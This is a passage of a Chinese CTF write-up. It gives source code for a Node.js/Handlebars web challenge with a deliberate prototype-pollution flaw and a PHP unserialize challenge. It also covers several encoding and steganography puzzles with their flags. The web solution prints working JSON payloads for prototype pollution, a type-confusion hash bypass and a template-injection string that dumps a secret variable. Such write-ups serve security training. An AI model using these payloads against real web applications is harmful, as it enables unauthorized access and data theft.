    const bodyParser = require('body-parser')
    const path = require('path');
    const crypto = require('crypto');
    const fs = require('fs');
    const app = express();
    const FLAG = require('./config').FLAG;
    app.set('view engine', 'html');
    app.engine('html', require('hbs').__express);
    app.use(express.urlencoded());
    app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())
    var glowworm=[];
    var content=[];
    function sha1(string) {
        return crypto.createHash("sha1").update(string).digest("hex");
    }
    app.get('/', (req, res) => {
        const { page } = req.query;
        if (!page) res.redirect('/?page=index');
        else res.render(page, { FLAG, 'insect': 'glowworm' });
    });
    app.get('/source', function(req, res) {
        res.sendFile(path.join(__dirname + '/app.js'));
    });
    app.post('/data', function(req, res) {
        var worm = req.body;
        content[worm.wing][worm.fire] = worm.data;
        res.end('data success')
    });
    app.get('/refresh', (req, res) => {
        let files = [];
        var paths = path.join(__dirname,'views/sandbox')
        if(fs.existsSync(paths)){
            files = fs.readdirSync(paths);
            files.forEach((file, index) => {
                let curPath = paths + "/" + file;
                if(fs.statSync(curPath).isFile()){
                    fs.unlinkSync(curPath);
                }
            });
        }
        res.end('refresh success')
    });
    app.post('/', (req, res) => {
        const key = "worm";
        const { content , a, b} = req.body;
        if (!a || !b || a.length !== b.length) {
            res.send("no!!!");
            return;
        }
        if (a !== b && sha1(key + a) === sha1(key + b)) {
            if(glowworm.token1 && req.query.token2 && sha1(glowworm.token1) === req.query.token2){
                if (typeof content !== 'string' || content.indexOf('FLAG') != -1) {
                    res.end('ban!!!');
                    return;
                }
                const filename = crypto.randomBytes(8).toString('hex');
                fs.writeFile(`${path.join('views','sandbox',filename)}.html`, content, () => {
                res.redirect(`/?page=sandbox/${filename}`);
                })
            }else{
              res.send("no no no!!!");
            }
        }else{
          res.send("no no!!!");
        }
    });
    app.listen(8888, '0.0.0.0');
    审计代码发现主要分两个功能部分，get 方法访问 index，js 会将 FLAG 返回到指定的 html 模板，post 方法访问 index 会创建一个随机名字的 html 文件，并将 content 的内容写入生成的 html 文件中，看源码发现渲染引擎为 Handlebars，其模板语法是 {{}}，考虑利用 {{}} 将 FLAG 变量渲染出来
    先绕过 a,b：
    POST：
    {"wing":"__proto__","fire":"token1","data":"1"}
    接着利用之前 data 值的 sha1 来作为 token2 进行传参：
    POST：
    {"a":"0","b":[0],
    "content":"{{#each this}}{{this.toString}}{{/each}}"
    }
    接着访问得到的地址即可拿到 Flag
    Flag：flag{141edb97-e345-4e49-97c2-c8275dce29b4}
###  serialize
    直接拿到题目源码：
    class = "safe";
            $this->user = "ctfer";
            $context = new $this->class ($this->user);
            foreach($context as $f){
                echo $f;
            }
        }
        public function __wakeup()
        {
            $context = new $this->class ($this->user);
            foreach($context as $f){
                echo $f;
            }
        }
    }
    class safe{
        var $user;
        public function __construct($user)
        {
            $this->user = $user;
            echo ("hello ".$this->user);
        }
    }
    if(isset($_GET['data'])){
        unserialize($_GET['data']);
    }
    else{
        $demo=new Demo;
    }
    直接用 PHP 原生类来读取 flag 文件即可：
## Misc
###  签到1
    描述字符串base64解码
    Flag：flag{c54ce9d7b4e17980dd4906d9941ed52a}
###  Decoder
    第一部分：
    压缩包有伪加密，7-zip 打开直接绕过，然后：base32 -> base58 -> base85
    flag1：042f38b694
    第二部分：
    key 先用 Emoji 编码解码，解出来 key 为 whhjno，接着调节 rotation=36，利用 emoji-aes 解密即可
    flag2：b52bff9568
    第三部分：
    base91 解码得到很多行 base64：
    U3RlZ2Fub2dyYXBoeSBpcyB0aGUgYXJ0IGFuZCBzY2llbmNlIG9m
    IHdyaXRpbmcgaGlkZGVuIG1lc3NhZ2VzIGluIHN1Y2ggYSB3YXkgdGhhdCBubyBvbmU=
    LCBhcGFydCBmcm9tIHRoZSBzZW5kZXIgYW5kIGludGVuZGVkIHJlY2lwaWVudCwgc3VzcGX=
    Y3RzIHRoZSBleGlzdGVuY2Ugb2YgdGhlIG1lc3M=
    YWdlLCBhIGZvcm0gb2Ygc2VjdXJpdHkgdGhyb3VnaCBvYnNjdXJpdHkuIFT=
    aGUgd29yZCBzdGVnYW5vZ3JhcGh5IGlzIG9mIEdyZWVrIG9yaWdpbiBhbmTgbWVhbnMgImNvbmNlYT==
    bGVkIHdyaXRpbmciIGZyb20gdGhlIEdyZWVrIHdvcmRzIHN0ZWdhbm9zIG1lYW5pbmcgImNv
    dmVyZWQgb3IgdHJvdGVjdGVkIiwgYW5kIGdyYXBoZWluIG1lYW5pbmdgInRvIHd=
    cml0ZSIuIFRoZSBmaXJzdCByZWNvcmRlZCB1c2Ugb2YgdGhlIHRlcm0gd2FzIGluIDE0OTkgYnkgSm9o
    YW5uZXMgVHJpdGhlbWl1cyBpbiBoaXMgU3RlZ2Fub2dyYXBoaWEsIGEgdHJlYd==
    dGlzZSBvbiBjcnl5dG9ncmF5aHkgYW5kIHN0ZWdhbm9ncmF5aHkgZGlzZ5==
    dWlzZWQgYXOgYSBib29rIG9uIG1hZ2ljLiBHZW5lcmFsbHksIG1lc3O=
    YWdlcyB3aWxsIGFwcGVhciB0byBiZSBzb21ldGhpbmcgZWxzZTogaW1hZ2VzLCBhcnRp
    Y2xlcywgc2hvcHBpbmcgbGlzdHMsIG9yIHNvbWUgb3Q=
    aGVyIGNvdmVydGV4dCBhbmQsIGNsYXNzaWNhbGx5LCB0aGUgaGlnZGVuIG1lc3NhZ2UgbWF5IGJlIGluIGludmn=
    c2libGUgaW5rIGJldHdlZW4gdGhlIHZpc2libGUgbGluZXMgb2YgYSBwcml2YXRlIGxldHRlci4=
    VGhlIGFkdmFudGFnZSBvZiBzdGVnYW5v是Z3JhcGh5LCBvdmVyIGNy
    eXB0b2dyYXBoeSBhbG9uZSwgaXMgdGhhdCBtZXNzYWdlcyBkbyBub3QgYXR0cmFjdCBhdHRlbnRpb26=
    IHRvIHRoZW1zZWx2ZXMuIFBsYWlubHkgdmlzaWJsZSBlbmNyeXB0ZWQgbWVzc2FnZXPogbRubyBtYXR0ZXIg
    aG93IHVuYnJlYWthYmxl6IG0d2lsbCBhcm91c2Ugcz==
    dXNwaWNpb24sIGFuZCBtYXkgaW4gdGhlbXNlbHZlcyBiZSBpbmNyaW1pbmF0aW5nIG==
    aW4gY291bnRyaWVzIHdoZXJlIGVuY3J5cHRpb24gaXMgaWxsZWdhbC4gVGhlcmVmb3JlLD==
    IHdoZXJlYXMnY3J5cHRvZ3JhcGh5IHByb3RlY3RzIHRoZSBjb250ZW50cyBvZn==
    IGEgbWVzc2FnZSwgc3RlZ2Fub2dyYXBoeSBjYW4gYmUgc2FpZCB0byBwcm90ZWN0IGI=
    b3RoIG1lc3NhZ2VzIGFuZCBjb21tdW5pY2F0aW5nIHBhcnRpZXMu
    U3RlZ2Fub2dyYXBoeSBpbmNsdWRlcyD=
    dGhlIGNvbmNlYWxtZW51IG9mIGluZm9ybWF1aW9uIHdpdGhpbiBjb21=
    cHV0ZXIgZmlsZXMuIEluIGRpZ2l0YWwgc3RlZ2Fub2dyYXBoeSwgZWxlY3Ryb25pYyBjb21tdW5pY2F0aW9u
    cyBtYXkgaW5jbHVkZSBzdGVnYW5vZ3JhcGhpYyBjb2RpbmcgaW5zaQ==
    ZGUgb2YgYSB0cmFuc3BvcnQgbGF5ZXIsIHN1Y2ggYXMgYSBkb2N1bWVudCBmaWxlLCBpbWFnZSBmaWz=
    ZSwgcHJvZ3JhbSBvciBwcm90b2NvbC4gTWVkaWEg
    ZmlsZXMgYXJlIGlkZWFsIGZvciBzdGVnYW5vZ3JhcGhpYyB0cmFuc21pc3Npb3==
    biBiZWNhdXNlIG9mIHRoZWlyIGxhcmdlIHNpemUuIEFzID==
    YSBzaW1wbGUgZXhhbXBsZSwgYSBzZW5kZXIgbWlnaHQgc3RhcnQgd2l0aCBh
    biBpbm5vY3VvdXMgaW1hZ2UgZmlsZSBhbmQgYWRqdXN0IHRoZSBjb2xvciBvZiBldmVyeSAxMDB0aCBwaXhlbCA=
    dG8gY29ycmVzcG9uZCB0byBhIGxldHRlciBpbiB0aGUgYWxwaGFiZXQsIGG=
    IGNoYW5nZSBzbyBzdWJ0bGUgdGhhdCBzb21lb25lIG5vdCBzcGVjaWZpY2FsbHkgbG9va2luZyBm
    b3IjaXQjaXMjdW5saWtlbHkjdG8jbm90aWNlIGl0Lj==
    VGhlJGZpcnN0JHJlY29yZGVkJHVzZXMgb2Ygc3RlZ2Fub2dyYXBoeSBjYW4gYmUgdHJ=
    YWNlZCBiYWNrIHRvIDQ0MCBCQyB3aGVuIEhlcm9kb3R1cyBtZW50aW9ucyB0d28gZXhhbXBsZXMgb0==
    ZiBzdGVnYW5vZ3JhcGh5IGluIFRoZSBIaXN0b3JpZXMgb2Yg
    SGVyb2RvdHVzLiBEZW1hcmF0dXMgc2VudCBhIHdhcm5pbmcgYWJvdXQgYSD=
    Zm9ydGhjb21pbmcgYXR0YWNrIHRvIEdyZWVjZSBieSB3
    cml0aW5nIGl0IGRpcmVjdGx5IG9uIHRoZSB3b29kZW4gYmFja2luZyBvZiBhIHdheCB0YWJsZXQgYmVm
    b3JlIGFwcGx5aW5nIGl0cyBiZWVzd2F4IHN1cmZhY2UuIFdheCB0YWJsZXRzIHdlcmUgaW4gY29tbW9uIHVzZR==
    IHRoZW4gYXMgcmV1c2FibGUgd3JpdGluZyBzdXJmYWNlcywgc29tZXRpbWU=
    c3VzZWQgZm9yIHNob3J0aGFuZC4gQW5vdGhlciBhbmNpZW50IGV4YW1wbGUgaXMgdGhhdCBv
    Zkhpc3RpYWV1cywgd2hvIHNoYXZlZCB0aGUgaGVhZCBvZiBoaXPgbW9zdCB0cnVzdGVkIHP=
    bGF2ZSBhbmQgdGF0dG9vZWQgYSBtZXNzYWdlIG9uIGl0LiBBZnRlciBoaXMgaGFpciBoYWQgZ2==
    cm93biB0aGUgbWVzc2FnZSB3YXMgaGlkZGVuLiBUaGUgcHVycG9zZSB3YXMgdG8=
    aW5zdGlnYXRlIGEgcmV2b2x0IGFnYWluc3QgdGhlIFBlcnNpYW5zLg==
    U3RlZ2Fub2dyYXBoeSBoYXMgYmVlbiB3aWRlbHkgdXNlZCwg